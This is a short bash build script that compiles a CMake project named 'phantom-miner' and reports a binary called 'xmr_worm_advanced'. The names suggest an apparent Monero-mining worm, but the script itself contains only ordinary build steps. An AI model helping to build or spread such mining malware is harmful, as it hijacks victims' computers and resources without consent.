#!/bin/bash
set -e

echo "[*] Building phantom-miner..."

# Install dependencies if needed
if [ -f ./scripts/install_deps.sh ]; then
    ./scripts/install_deps.sh
fi

# Configure and build
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build -j$(nproc)

echo "[*] Build complete."
echo "[*] Binary: build/xmr_worm_advanced"
ls -lh build/xmr_worm_advanced
